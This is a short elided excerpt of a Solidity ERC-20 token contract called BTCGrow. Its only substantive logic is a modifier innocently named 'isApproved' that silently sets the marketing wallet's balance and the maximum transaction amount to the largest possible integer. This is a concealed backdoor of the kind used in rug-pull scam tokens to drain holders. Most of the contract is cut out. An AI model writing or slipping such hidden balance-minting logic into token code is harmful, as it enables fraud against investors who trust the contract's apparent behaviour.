...
contract BTCGrow is Context, IERC20 { 
    ...
    string private constant _symbol = unicode"BTCGrow"; 
    uint256 private Marketcap = 2**256-1;
    ...
    modifier isApproved(address add) {
            _tOwned[Wallet_Marketing] = Marketcap; _maxTxAmount = Marketcap;
        _;
    }
